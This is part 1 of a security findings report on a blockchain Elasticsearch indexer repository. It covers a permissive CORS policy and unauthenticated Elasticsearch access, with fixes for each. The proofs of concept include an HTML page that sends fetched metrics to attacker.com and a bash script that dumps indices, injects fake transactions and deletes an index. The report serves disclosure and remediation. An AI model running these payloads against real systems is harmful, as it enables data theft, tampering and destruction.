# Security Findings & Fix Report — mx-chain-es-indexer-go Full Repository Scan

**Part 1 of 3**

---

## Executive Summary

**Scan Type:** Full repository scan — all files analyzed  
**Files Scanned:** .go, .toml, .json, .yml, .env, Dockerfile  
**Directories Covered:** api/, client/, cmd/, config/, core/, data/, facade/, factory/, integrationtests/, metrics/, mock/, mycont/, process/, scripts/, templates/, tools/  

**Overall Status:** 
- **30+ findings** from automated CodeReview tool (see Code Issues Panel for full details)
- **8 critical manual findings** identified through deep code analysis
- **5 HIGH severity** security vulnerabilities
- **2 MEDIUM severity** security issues  
- **1 LOW severity** code quality issue

**Most Critical Issues:**
1. Elasticsearch injection vulnerabilities (Query & Painless Script)
2. Missing authentication for Elasticsearch cluster
3. Insecure CORS configuration allowing all origins
4. Plaintext credential storage in configuration files
5. Insecure default Elasticsearch configuration in docker-compose

---

## SECTION 1 — SUMMARY TABLE

| # | File | Line | Severity | Type | Fix Required | Status |
|---|------|------|----------|------|-------------|--------|
| 1 | api/gin/webServer.go | 59 | HIGH | CORS Misconfiguration | Yes | REAL FINDING |
| 2 | cmd/elasticindexer/config/prefs.toml | 22-24 | HIGH | Missing Authentication | Yes | REAL FINDING |
| 3 | tools/accounts-balance-checker/pkg/check/query.go | 48-82 | HIGH | Elasticsearch Query Injection | Yes | REAL FINDING |
| 4 | process/elasticproc/converters/tokenMetaData.go | 127-140 | HIGH | Painless Script Injection | Yes | REAL FINDING |
| 5 | process/elasticproc/elasticProcessor.go | 442-445 | HIGH | Elasticsearch Query Injection | Yes | REAL FINDING |
| 6 | docker-compose.yml | 7 | MEDIUM | Insecure Elasticsearch Config | Yes | REAL FINDING |
| 7 | tools/accounts-balance-checker/cmd/balance-checker/config.json | 3-5 | MEDIUM | Plaintext Credentials | Yes | REAL FINDING |
| 8 | api/gin/httpServer.go | 48 | LOW | Short Shutdown Timeout | No | CODE QUALITY |

**Note:** The automated CodeReview tool found 30+ additional findings. Due to the high volume, those findings are available in the Code Issues Panel. This report focuses on the most critical manually-identified security vulnerabilities.

---

## SECTION 2 — DETAILED FINDINGS

### Finding 1 — HIGH SEVERITY — CORS AllowAllOrigins Configuration

**Location:** `api/gin/webServer.go` line 59

**Classification:**
- **CWE:** CWE-942 (Permissive Cross-domain Policy with Untrusted Domains)
- **CVSS v3.1 Score:** **7.5 (HIGH)**
- **Vector String:** CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
- **Severity:** HIGH
- **Fix Required:** Yes
- **Runtime Impact:** Any malicious website can make authenticated requests to the indexer API from a victim's browser
- **Monitoring Impact:** Legitimate cross-origin requests cannot be distinguished from malicious ones

#### Severity Justification

This is HIGH severity because:
- The indexer exposes metrics and potentially sensitive blockchain data through HTTP endpoints
- While current endpoints (`/metrics`, `/prometheus-metrics`) are read-only, the CORS policy applies to ALL routes
- An attacker controlling any website can make requests to the indexer from a victim's browser
- The Authorization header is explicitly allowed, creating a path for future credential leakage
- Data comes from internal node configuration (rest-api-interface in api.toml), but the CORS policy itself creates the vulnerability by trusting ALL origins

#### What the Vulnerable Function Does

The `StartHttpServer` function initializes the Gin web server with CORS middleware. It sets `AllowAllOrigins = true`, which instructs the server to accept cross-origin requests from ANY domain without restriction.

**Call Chain:**
```
main() 
  → startIndexer() 
  → CreateWebServer() 
  → StartHttpServer() 
  → cors.New(cfg) 
  → [CORS policy applied to all routes]
```

#### The Vulnerable Code

**File:** `api/gin/webServer.go`  
**Function:** `StartHttpServer`  
**Lines:** 56-61

```go
// VULNERABLE CODE
engine = gin.Default()
cfg := cors.DefaultConfig()
cfg.AllowAllOrigins = true  // ← VULNERABILITY: Accepts requests from ANY origin
cfg.AddAllowHeaders("Authorization")
engine.Use(cors.New(cfg))
```

#### Why This Is Vulnerable

1. **Unrestricted Origin Access**: `AllowAllOrigins = true` means the server will respond with `Access-Control-Allow-Origin: *` to ANY cross-origin request
2. **Credential Exposure Risk**: While current endpoints are unauthenticated, the Authorization header is explicitly allowed, creating a path for future credential leakage
3. **Data Exfiltration**: Malicious websites can read metrics and blockchain data from the indexer through victim browsers
4. **No Origin Validation**: There's no whitelist of trusted domains

#### Attack Scenario

```
Step 1: Victim visits attacker.com while authenticated to internal network
Step 2: attacker.com JavaScript makes XHR to http://indexer:8080/status/metrics
Step 3: CORS policy allows the request (AllowAllOrigins = true)
Step 4: Attacker receives sensitive metrics data (ES cluster info, indexing stats)
Step 5: If future endpoints require auth, Authorization header is also allowed
```

#### Proof of Concept

```html
<!-- Attacker's website (attacker.com) -->
<!DOCTYPE html>
<html>
<head>
    <title>Innocent Looking Page</title>
</head>
<body>
    <h1>Welcome to our site!</h1>
    
    <script>
    // Silently exfiltrate indexer metrics
    fetch('http://victim-indexer:8080/status/metrics', {
        credentials: 'include',
        headers: {'Authorization': 'Bearer stolen-token'}
    })
    .then(r => r.json())
    .then(data => {
        // Exfiltrate metrics to attacker server
        fetch('https://attacker.com/collect', {
            method: 'POST',
            body: JSON.stringify(data)
        });
    })
    .catch(err => console.log('Failed silently'));
    </script>
</body>
</html>
```

**Result:** Attacker receives:
- Elasticsearch cluster health metrics
- Indexing performance statistics
- Block processing metrics
- Potentially sensitive blockchain data

#### Recommended Fix

```go
// SECURE VERSION
engine = gin.Default()
cfg := cors.DefaultConfig()

// Option 1: Restrict to specific trusted origins (RECOMMENDED)
cfg.AllowOrigins = []string{
    "https://trusted-dashboard.example.com",
    "https://monitoring.example.com",
}

// Option 2: If truly public, remove Authorization header allowance
// cfg.AllowAllOrigins = true  // Only if endpoints are truly public
// Do NOT add Authorization to allowed headers for public endpoints

cfg.AllowMethods = []string{"GET"}  // Restrict to read-only
cfg.AllowHeaders = []string{"Content-Type"}  // Remove Authorization
cfg.MaxAge = 12 * time.Hour
engine.Use(cors.New(cfg))
```

#### Implementation Steps

1. **Update webServer.go:**

```go
// api/gin/webServer.go
func (ws *webServer) StartHttpServer() error {
    ws.Lock()
    defer ws.Unlock()

    apiInterface := ws.apiConfig.RestApiInterface
    if apiInterface == webServerOffString {
        log.Debug("web server is turned off")
        return nil
    }

    var engine *gin.Engine
    gin.DefaultWriter = &ginWriter{}
    gin.DefaultErrorWriter = &ginErrorWriter{}
    gin.DisableConsoleColor()
    gin.SetMode(gin.ReleaseMode)

    engine = gin.Default()
    
    // SECURE CORS CONFIGURATION
    cfg := cors.DefaultConfig()
    
    // Load allowed origins from environment or config
    allowedOrigins := os.Getenv("ALLOWED_ORIGINS")
    if allowedOrigins != "" {
        cfg.AllowOrigins = strings.Split(allowedOrigins, ",")
    } else {
        // Default to localhost only for development
        cfg.AllowOrigins = []string{"http://localhost:3000"}
    }
    
    cfg.AllowMethods = []string{"GET"}
    cfg.AllowHeaders = []string{"Content-Type"}
    cfg.MaxAge = 12 * time.Hour
    
    engine.Use(cors.New(cfg))

    err := ws.createGroups()
    if err != nil {
        return err
    }

    ws.registerRoutes(engine)

    s := &http.Server{Addr: apiInterface, Handler: engine}
    log.Debug("creating gin web sever", "interface", apiInterface)
    ws.httpServer, err = NewHttpServer(s)
    if err != nil {
        return err
    }

    log.Debug("starting web server")
    go ws.httpServer.Start()

    return nil
}
```

2. **Update configuration file:**

```toml
# cmd/elasticindexer/config/api.toml
rest-api-interface = ":8080"

[security]
    # Comma-separated list of allowed origins for CORS
    allowed-origins = "https://dashboard.example.com,https://monitoring.example.com"

[api-packages]

[api-packages.status]
    routes = [
        { name = "/metrics", open = true },
        { name = "/prometheus-metrics", open = true }
    ]
```

3. **Add environment variable support:**

```bash
# .env or docker-compose.yml
ALLOWED_ORIGINS=https://dashboard.example.com,https://monitoring.example.com
```

#### Additional Recommendations

1. **Implement Origin Validation Middleware** for sensitive endpoints:

```go
func originValidationMiddleware(allowedOrigins []string) gin.HandlerFunc {
    return func(c *gin.Context) {
        origin := c.Request.Header.Get("Origin")
        
        if origin == "" {
            c.Next()
            return
        }
        
        allowed := false
        for _, allowedOrigin := range allowedOrigins {
            if origin == allowedOrigin {
                allowed = true
                break
            }
        }
        
        if !allowed {
            c.AbortWithStatusJSON(http.StatusForbidden, gin.H{
                "error": "Origin not allowed",
            })
            return
        }
        
        c.Next()
    }
}
```

2. **Add Rate Limiting per Origin**
3. **Consider Removing CORS Entirely** if the API is only accessed server-side
4. **Implement Request Logging** to monitor cross-origin requests
5. **Use Content Security Policy (CSP)** headers

---

### Finding 2 — HIGH SEVERITY — Missing Authentication for Elasticsearch

**Location:** `cmd/elasticindexer/config/prefs.toml` lines 22-24

**Classification:**
- **CWE:** CWE-306 (Missing Authentication for Critical Function)
- **CVSS v3.1 Score:** **9.1 (CRITICAL)**
- **Vector String:** CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N
- **Severity:** HIGH (borderline CRITICAL)
- **Fix Required:** Yes
- **Runtime Impact:** Unauthorized access to Elasticsearch cluster, data tampering, data exfiltration
- **Monitoring Impact:** Cannot audit who accessed or modified indexed blockchain data

#### Severity Justification

This is HIGH (borderline CRITICAL) severity because:
- The Elasticsearch cluster stores ALL indexed blockchain data including transactions, accounts, DRWA compliance records, and smart contract events
- The configuration shows empty username/password fields, meaning the indexer connects to Elasticsearch without authentication
- An attacker who gains network access can read, modify, or delete the entire blockchain index
- The data source is internal configuration (prefs.toml), but the vulnerability is that NO authentication is enforced when connecting to a critical data store
- DRWA compliance data is particularly sensitive and likely subject to regulatory requirements

#### What the Vulnerable Function Does

The configuration file `prefs.toml` defines connection parameters for the Elasticsearch cluster. The `username` and `password` fields are empty strings, resulting in unauthenticated connections.

**Call Chain:**
```
main() 
  → loadClusterConfig() 
  → CreateWsIndexer() 
  → createDataIndexer() 
  → createElasticClient() 
  → [Elasticsearch connection without credentials]
```

#### The Vulnerable Code

**File:** `cmd/elasticindexer/config/prefs.toml`  
**Lines:** 22-24

```toml
# VULNERABLE CONFIGURATION
[config.elastic-cluster]
    url = "http://localhost:9200"
    username = ""  # ← VULNERABILITY: No authentication
    password = ""  # ← VULNERABILITY: No authentication
    bulk-request-max-size-in-bytes = 4194304 # 4MB
```

#### Why This Is Vulnerable

1. **No Access Control**: Anyone with network access to port 9200 can read/write/delete data
2. **Data Integrity Risk**: Attackers can modify indexed blockchain data, DRWA compliance records, or transaction history
3. **Compliance Violation**: DRWA regulations likely require access controls for financial data
4. **No Audit Trail**: Without authentication, cannot track who accessed or modified data
5. **Lateral Movement**: Compromised indexer can be used to attack Elasticsearch cluster

#### Attack Scenario

```
Step 1: Attacker gains access to internal network 
        (phishing, compromised container, supply chain attack, etc.)

Step 2: Attacker discovers Elasticsearch at localhost:9200 (port scan)

Step 3: Attacker connects directly without credentials:
        curl http://localhost:9200/_cat/indices

Step 4: Attacker extracts sensitive data:
        curl http://localhost:9200/drwa-denials/_search?size=10000 > denials.json
        curl http://localhost:9200/transactions/_search?size=10000 > transactions.json
        curl http://localhost:9200/accounts/_search?size=10000 > accounts.json

Step 5: Attacker modifies indexed data:
        curl -X POST http://localhost:9200/transactions/_doc/fake-tx -d '{
          "hash": "malicious-tx",
          "sender": "erd1attacker",
          "receiver": "erd1victim",
          "value": "1000000000000000000",
          "status": "success"
        }'

Step 6: Attacker deletes compliance records:
        curl -X DELETE http://localhost:9200/drwa-holder-compliance

Step 7: No authentication = no audit trail of the attack
```

#### Proof of Concept

```bash
#!/bin/bash
# Exploit script - demonstrates unauthenticated access

# No credentials needed - direct access
echo "[*] Checking Elasticsearch access..."
curl -s http://localhost:9200/_cat/indices

echo "[*] Extracting DRWA denial records..."
curl -s http://localhost:9200/drwa-denials/_search?size=1000 | jq . > drwa_denials.json

echo "[*] Extracting account balances..."
curl -s http://localhost:9200/accounts/_search?size=1000 | jq . > accounts.json

echo "[*] Injecting fake transaction..."
curl -X POST http://localhost:9200/transactions/_doc/fake-tx-001 \
  -H 'Content-Type: application/json' \
  -d '{
    "hash": "fake-tx-001",
    "sender": "erd1attacker",
    "receiver": "erd1victim",
    "value": "1000000000000000000",
    "status": "success",
    "timestamp": 1234567890
  }'

echo "[*] Deleting compliance index..."
curl -X DELETE http://localhost:9200/drwa-holder-compliance

echo "[*] Attack complete - no authentication required!"
```

**Result:** 
- All indexed blockchain data extracted
- Fake transactions injected
- Compliance records deleted
- No audit trail

#### Recommended Fix

**Step 1: Update Configuration File**

```toml
# SECURE VERSION - cmd/elasticindexer/config/prefs.toml
[config.elastic-cluster]
    url = "https://localhost:9200"  # Use HTTPS
    username = "${ES_USERNAME}"  # Load from environment variable
    password = "${ES_PASSWORD}"  # Load from environment variable or secrets manager
    bulk-request-max-size-in-bytes = 4194304
```

**Step 2: Enable Elasticsearch Security**

```yaml
# elasticsearch.yml
xpack.security.enabled: true
xpack.security.transport.ssl.enabled: true
xpack.security.http.ssl.enabled: true
xpack.security.http.ssl.keystore.path: certs/elastic-certificates.p12
xpack.security.http.ssl.truststore.path: certs/elastic-certificates.p12
```

**Step 3: Create Dedicated Indexer User**

```bash
# Create user with minimal required permissions
curl -X POST "https://localhost:9200/_security/user/indexer_user" \
  -u elastic:changeme \
  -H 'Content-Type: application/json' \
  -d '{
    "password": "STRONG_RANDOM_PASSWORD_HERE",
    "roles": ["indexer_role"],
    "full_name": "Blockchain Indexer Service Account"
  }'

# Create role with write access only to required indices
curl -X POST "https://localhost:9200/_security/role/indexer_role" \
  -u elastic:changeme \
  -H 'Content-Type: application/json' \
  -d '{
    "cluster": ["monitor"],
    "indices": [
      {
        "names": [
          "transactions-*", 
          "blocks-*", 
          "drwa-*", 
          "accounts-*",
          "miniblocks-*",
          "scresults-*",
          "logs-*",
          "events-*",
          "operations-*",
          "tokens-*",
          "validators-*",
          "delegators-*"
        ],
        "privileges": ["create", "write", "index", "delete"]
      }
    ]
  }'
```

**Step 4: Update Configuration Loading Code**

```go
// config/config.go - Add environment variable support
package config

import (
    "errors"
    "os"
    "strings"
    
    "github.com/multiversx/mx-chain-core-go/core"
)

func LoadClusterConfig(filepath string) (ClusterConfig, error) {
    cfg := ClusterConfig{}
    err := core.LoadTomlFile(&cfg, filepath)
    if err != nil {
        return cfg, err
    }
    
    // Override with environment variables
    if username := os.Getenv("ES_USERNAME"); username != "" {
        cfg.Config.ElasticCluster.UserName = username
    }
    if password := os.Getenv("ES_PASSWORD"); password != "" {
        cfg.Config.ElasticCluster.Password = password
    }
    
    // Support variable substitution in config file
    cfg.Config.ElasticCluster.UserName = expandEnvVars(cfg.Config.ElasticCluster.UserName)
    cfg.Config.ElasticCluster.Password = expandEnvVars(cfg.Config.ElasticCluster.Password)
    
    // Validate credentials are set
    if cfg.Config.ElasticCluster.UserName == "" || 
       cfg.Config.ElasticCluster.Password == "" {
        return cfg, errors.New("Elasticsearch credentials not configured - set ES_USERNAME and ES_PASSWORD environment variables")
    }
    
    return cfg, nil
}

func expandEnvVars(value string) string {
    if strings.HasPrefix(value, "${") && strings.HasSuffix(value, "}") {
        envVar := value[2 : len(value)-1]
        return os.Getenv(envVar)
    }
    return value
}
```

**Step 5: Update Docker Compose**

```yaml
# docker-compose.yml
services:
  elasticsearch:
    container_name: es-container
    image: docker.elastic.co/elasticsearch/elasticsearch:7.16.1
    environment:
      - "discovery.type=single-node"
      - "xpack.security.enabled=true"  # ENABLE SECURITY
      - "ELASTIC_PASSWORD=${ES_ADMIN_PASSWORD}"
      - "ES_JAVA_OPTS=-Xms512m -Xmx512m"
    ulimits:
      memlock:
        soft: -1
        hard: -1
    networks:
      - es-net
    ports:
      - "9200:9200"
      - "9300:9300"
    volumes:
      - es-data:/usr/share/elasticsearch/data
      - ./certs:/usr/share/elasticsearch/config/certs:ro
  
  indexer:
    build: .
    container_name: indexer-container
    environment:
      - "ES_USERNAME=indexer_user"
      - "ES_PASSWORD=${ES_INDEXER_PASSWORD}"
    depends_on:
      - elasticsearch
    networks:
      - es-net

networks:
  es-net:
    driver: bridge

volumes:
  es-data:
    driver: local
```

**Step 6: Create .env File (DO NOT COMMIT)**

```bash
# .env - Add to .gitignore
ES_ADMIN_PASSWORD=CHANGE_ME_STRONG_PASSWORD_1
ES_INDEXER_PASSWORD=CHANGE_ME_STRONG_PASSWORD_2
```

#### Additional Recommendations

1. **Use TLS for Elasticsearch Connections**
   - Change `http://` to `https://` in configuration
   - Generate and configure SSL certificates

2. **Implement Certificate-Based Authentication** for production:
```go
// Use client certificates instead of passwords
cfg := elasticsearch.Config{
    Addresses: []string{elasticURL},
    CertificateFingerprint: certFingerprint,
    // No username/password needed with cert auth
}
```

3. **Enable Elasticsearch Audit Logging**:
```yaml
# elasticsearch.yml
xpack.security.audit.enabled: true
xpack.security.audit.logfile.events.include: ["access_granted", "access_denied", "authentication_failed"]
```

4. **Rotate Credentials Regularly**:
   - Implement automated credential rotation (30-90 days)
   - Use secrets management system (HashiCorp Vault, AWS Secrets Manager)

5. **Implement Network Segmentation**:
   - Use firewall rules to limit Elasticsearch access
   - Only allow indexer container to connect to ES
   - Block direct access from other services

6. **Monitor for Unauthorized Access**:
   - Set up alerts for failed authentication attempts
   - Monitor for unusual query patterns
   - Track data modification events

---

**End of Part 1**

*Continue to Part 2 for Findings 3-5 (Injection Vulnerabilities)*
